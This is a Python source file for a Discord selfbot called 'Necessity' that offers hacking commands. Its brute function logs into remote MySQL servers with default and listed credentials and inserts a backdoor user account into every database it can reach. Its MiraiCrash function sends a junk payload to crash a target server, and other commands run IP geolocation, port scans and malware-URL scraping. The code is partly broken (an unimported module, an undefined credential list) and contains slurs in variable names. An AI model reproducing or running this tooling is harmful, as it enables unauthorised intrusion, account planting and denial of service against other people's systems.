import socket, sys, discord, base64, mysql.connector, threading, requests
from tpblite import TPB
from sys import argv
from requests import get
from time import sleep
from discord.ext import commands
from colorama import init, Fore
from bs4 import BeautifulSoup
from os import system
from colored import fg, attr

init()
system("@echo off")
system("cls")
system("mode con: cols=105 lines=30")
system('title ' + 'Python SelfBot by sv')

def logo():
    try:
        print(Fore.CYAN)
        msg = f"""
████████████████████████████████████████████████████████████████████████████{Fore.RESET}{Fore.MAGENTA}
█░░░░░░░░░░░░░░█░░░░░░█████████░░░░░░█████████░░░░░░░░░░░░░░█░░░░░░██░░░░░░█{Fore.RESET}{Fore.CYAN}
█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀░░█████████░░▄▀░░█████████░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀░░██░░▄▀░░█{Fore.RESET}{Fore.MAGENTA}
█░░▄▀░░░░░░▄▀░░█░░▄▀░░█████████░░▄▀░░█████████░░▄▀░░░░░░▄▀░░█░░▄▀░░██░░▄▀░░█{Fore.RESET}{Fore.CYAN}
█░░▄▀░░██░░▄▀░░█░░▄▀░░█████████░░▄▀░░█████████░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░█{Fore.RESET}{Fore.MAGENTA}
█░░▄▀░░░░░░▄▀░░█░░▄▀░░█████████░░▄▀░░█████████░░▄▀░░░░░░▄▀░░█░░▄▀░░░░░░▄▀░░█{Fore.RESET}{Fore.CYAN}
█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀░░█████████░░▄▀░░█████████░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█{Fore.RESET}{Fore.MAGENTA}
█░░▄▀░░░░░░▄▀░░█░░▄▀░░█████████░░▄▀░░█████████░░▄▀░░░░░░▄▀░░█░░▄▀░░░░░░▄▀░░█{Fore.RESET}{Fore.CYAN}
█░░▄▀░░██░░▄▀░░█░░▄▀░░█████████░░▄▀░░█████████░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░█{Fore.RESET}{Fore.MAGENTA}
█░░▄▀░░██░░▄▀░░█░░▄▀░░░░░░░░░░█░░▄▀░░░░░░░░░░█░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░█{Fore.RESET}{Fore.CYAN}
█░░▄▀░░██░░▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░█{Fore.RESET}{Fore.MAGENTA}
█░░░░░░██░░░░░░█░░░░░░░░░░░░░░█░░░░░░░░░░░░░░█░░░░░░██░░░░░░█░░░░░░██░░░░░░█{Fore.RESET}{Fore.CYAN}
████████████████████████████████████████████████████████████████████████████
  
     \n
        """
        for l in msg:
            print(l, end="")

    except KeyboardInterrupt:
        sys.exit()

logo()

print(Fore.RESET)
print('  ')
print('{}╔═════ Commands ════════════════════════════════╗{}'.format(Fore.CYAN, Fore.LIGHTWHITE_EX))
print('{}║{}'.format(Fore.MAGENTA, Fore.LIGHTWHITE_EX))
print('{}║ [I] .iplookup ip :{} (ip geolocation)'.format(Fore.CYAN, Fore.LIGHTWHITE_EX))
print('{}║ [II] .portscan ip :{} (portscan ip)'.format(Fore.MAGENTA, Fore.LIGHTWHITE_EX))
print('{}║ [III] .miraibrute ip :{} (brute a mirai variant)'.format(Fore.CYAN, Fore.LIGHTWHITE_EX))
print('{}║ [IV] .miraicrash ip port :{} (crash a mirai variant)'.format(Fore.MAGENTA, Fore.LIGHTWHITE_EX))
print('{}║ [V] .urlhaus :{} (shows urlhause newest hits)'.format(Fore.CYAN, Fore.LIGHTWHITE_EX))
print('{}║{}'.format(Fore.MAGENTA, Fore.LIGHTWHITE_EX))
print('{}╚══════════════════════════════════════════════╝{}'.format(Fore.CYAN, Fore.LIGHTWHITE_EX))
print('  ')

def check_ip(ip):
    i = 0
    ip_valid = True
    for element in ip:
        if element == '.':
            i += 1
        else:
            try:
                int(element)
            except:
                ip_valid = False
                pass
    if not i == 3:
        ip_valid = False
    return ip_valid

def brute(ip):
        try:
            print("   %s╠[%s+%s]%s Attempting to brute SQL server..." % (fg(14),fg(3),fg(14),fg(2)))
            
            conn = pymysql.connect(host=ip,user='root',password='root',charset='utf8mb4',cursorclass=pymysql.cursors.DictCursor,read_timeout=5,write_timeout=5,connect_timeout=5)
            cursor = conn.cursor()
            print(f"   %s╠[%s+%s]%s Login Successfull!" % (fg(14),fg(3),fg(14),fg(2)))
            cursor.execute('show databases')
            for a_dict in cursor.fetchall():
                for db in a_dict:
                    try:
                        cursor.execute(f'use {a_dict[db]};')
                        print("   %s╠[%s+%s]%s Attempting to inject to table users..." % (fg(14),fg(3),fg(14),fg(2)))
                        cursor.execute("INSERT INTO users VALUES (NULL, 'ipdowned', 'isaskid', 0, 0, 0, 0, -1, 1, 30, '');")
                        print(f"   %s╠[%s+%s]%s Success on {ip} Username: ipdowned Password: isaskid" % (fg(14),fg(3),fg(14),fg(2)))
                        return
                    except:
                        pass
        except Exception as e:
            if 'Access denied' in str(e):
                for combo in creds.splitlines():
                    if combo == '':
                        continue
                    uname = combo[:combo.index(':')]
                    try:
                        password = combo[combo.index(':')+1:]
                    except ValueError:
                        password = ''
                    try:
                        print(f"   %s╠[%s+%s]%s Trying {uname}:{password}" % (fg(14),fg(3),fg(14),fg(2)))
                        conn = pymysql.connect(host=ip,user=uname,password=password,charset='utf8mb4',cursorclass=pymysql.cursors.DictCursor,read_timeout=5,write_timeout=5,connect_timeout=5)
                        print(f"   %s╠[%s+%s]%s Login Successfull!" % (fg(14),fg(3),fg(14),fg(2)))
                        cursor = conn.cursor()
                        cursor.execute('show databases')
                        for a_dict in cursor.fetchall():
                            for db in a_dict:
                                try:
                                    cursor.execute(f'use {a_dict[db]};')
                                    print("   %s╠[%s+%s]%s Attempting to inject to table users..." % (fg(14),fg(3),fg(14),fg(2)))
                                    cursor.execute("INSERT INTO users VALUES (NULL, 'ipdowned', 'isaskid', 0, 0, 0, 0, -1, 1, 30, '');")
                                    print(f"   %s╠[%s+%s]%s Success on {ip} Username: ipdowned Password: isaskid" % (fg(14),fg(3),fg(14),fg(2)))
                                    return
                                except:
                                    pass
                    except:
                        pass
            else:
                pass
        print("   %s╠[%s+%s]%sBrute Failed! %sBetter luck next time!%s" % (fg(14),fg(3),fg(14),fg(1),fg(3),attr(0)))

class Main:

    def MiraiCrash(ip,port):
        payload = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa$(*£&(*&$^*(^£*&)((*&)(*&()))))" * 25
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip,port))
        s.send(payload.encode())
        s.close()

    def MiraiBrute():
        try:
            ip = input("   %s╠[%s+%s]%sEnter IP Address:" % (fg(14),fg(3),fg(14),fg(3)))
            while not check_ip(ip):
                ip = input("   %s╠[%s+%s]%sInvalid IP Address. %sEnter a Valid IP: %s" % (fg(14),fg(3),fg(14),fg(1),fg(3),attr(0)))
            brute(ip)
        except KeyboardInterrupt:
            print('')
            pass

    def UrlhausScrape():
        global malwareArray
        scraper = get("https://urlhaus-api.abuse.ch/v1/urls/recent")
        jsonresp = scraper.json()
        malwareArray = []
        for x in range(10):
            malwareArray.append(jsonresp["urls"][x]["url"])
    
    def FileDropperScrape(link, keyword):
        global linkArray
        fl = keyword[:1]
        url = f"https://www.filedropper.com/lister.php?id={fl}"
        yeet = requests.utils.default_headers()
        yeet.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246',
        })
        page = get(url, headers=yeet)
        bigHAX = page.content
        scrapeySCRAPEYNIGGA = BeautifulSoup(bigHAX, 'lxml')
        links = [a.get('href') for a in scrapeySCRAPEYNIGGA.find_all('a', href=True)]
        linkArray = []
        for x in links:
            if keyword not in x:
                pass
            elif "file" not in x:
                pass
            else:
                linkArray.append(x)
            
class Bot(object):

    global bot
    bot = commands.Bot(command_prefix=".", self_bot=True)
    bot.remove_command('help')
    if bot.loop.is_running:
        print(f"{Fore.MAGENTA}> Necessity Online.\n----Logs/Errors----")

    @bot.command(aliases=["miraibrute"])
    async def MiraiBruteCmd(ctx):
        Main.MiraiBrute()

    @bot.command(aliases=["portscan"])
    async def tcpportscan_func(ctx, arg1):
        print(f"{Fore.MAGENTA}[Necessity - Logs] Portscan Used by {ctx.message.author} With IP {arg1}")
        scanyuh = get("https://api.hackertarget.com/nmap/?q=%s" % arg1)
        result = scanyuh.text.strip(" ( https://nmap.org/ )")
        await ctx.send(f"`{result}`")

    @bot.command(aliases=["miraicrash"])
    async def MiraiCrashCmd(ctx, arg1, arg2):
        print(f"{Fore.CYAN}[Necessity - Logs] MiraiCrash Used by {ctx.message.author} With IP {arg1} & Port {arg2}")
        ip = arg1
        port = int(arg2)
        Main.MiraiCrash(ip,port)
        await ctx.send(f"`{ip} CNC Down.`")

    @bot.command(aliases=["urlhaus"])
    async def UrlhausScrapeCmd(ctx):
        print(f"{Fore.MAGENTA}[Necessity - Logs] Urlhaus Scraper Used by {ctx.message.author}")
        Main.UrlhausScrape()
        for i in malwareArray:
            await ctx.send(f"`Malware sample: {i}`")
            sleep(0.5) 
     
    @bot.command(aliases=["test"])
    async def TestCmd(ctx):
        await ctx.send("```necessity bot online.```")

    @bot.command(aliases=["cmds", "help"])
    async def HelpCmd(ctx):
        print(f"[Necessity - Logs] Help used by {ctx.message.author}")
        await ctx.send(f"""```Prefix: {bot.command_prefix}
patience and love is a necessity but, life is just the beginning.
welcome to necessity selfbot!
-----------------------------
commands:
iplookup ip                    (ip geolocation)
portscan ip                    (portscan ip)
miraibrute ip                  (brute a mirai variant)
miraicrash ip port             (crash a mirai variant)
urlhaus                        (shows urlhause newest hits)
github keyword                 (scrapes github for projects)
linkvertise url                (bypass linkvertise)```""")
    
    @bot.command(aliases=["prefix"])
    async def PrefixChangeCmd(ctx, arg1):
        bot.command_prefix = arg1
        await ctx.send(f"`prefix updated: {bot.command_prefix}`")

    @bot.command(aliases=["iplookup"])
    async def iplookup_function(ctx, arg1):
        print(f"{Fore.BLUE}[Necessity - Logs] Iplookup Used by {ctx.message.author} With IP {arg1}")
        gay = get("http://ip-api.com/json/%s?fields=65535" % arg1)
        ipjson = gay.json()
        await ctx.send("`Status: "+ipjson["status"]+"\nCountry: "+ipjson["country"]+"\nRegion: "+ipjson["regionName"]+"\nCity: "+ipjson["city"]+"\nZip: "+str(ipjson["zip"])+"\nLat: "+str(ipjson["lat"])+"\nLon: "+str(ipjson["lon"])+"\nIsp: "+ipjson["isp"]+"\nOrg: "+ipjson["org"]+"\nAS: "+ipjson["as"]+"\nHostname: "+ipjson["reverse"]+"`")





    
    bot.run("token", bot=False)

Bot()
